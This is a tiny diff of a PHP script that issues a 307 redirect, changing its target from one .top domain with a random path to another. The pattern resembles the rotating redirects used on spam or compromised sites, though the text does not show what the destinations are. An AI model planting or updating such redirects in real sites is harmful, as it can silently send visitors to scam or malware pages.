@@ -3,6 +3,6 @@
 http_response_code(307);
 
 // Выполняем редирект на нужный URL
-header('Location: https://touchtools.top/HpGFDX');
+header('Location: https://aahyperscopepro.top/bQHGXS');
 exit();
 ?>
